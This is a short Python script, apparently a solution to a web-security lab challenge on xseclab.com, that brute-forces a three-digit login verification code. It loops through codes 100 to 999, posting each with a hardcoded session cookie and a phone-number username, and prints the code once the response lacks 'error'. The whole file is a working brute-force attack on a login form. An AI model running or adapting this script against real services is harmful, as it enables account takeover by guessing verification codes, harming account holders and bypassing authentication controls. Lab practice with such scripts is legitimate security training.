#!/usr/bin/env python3.4

import requests, threading

s = requests.session()
header = {
'Cookie':'saeut=124.89.2.88.1434295791298139; PHPSESSID=cce5635812b7a8cad07ae7f41b2f4598',
}
value = {
		'username':'13399999999',
		'vcode':1234,
		'vcode':'',
}

for i in range(100, 1000):
	value['vcode'] = i
	r = s.post('http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php',headers=header,data=value)
	if 'error' not in str(r.content):
		print('find pwd: %d ' % i)
		print(r.content)
		exit()
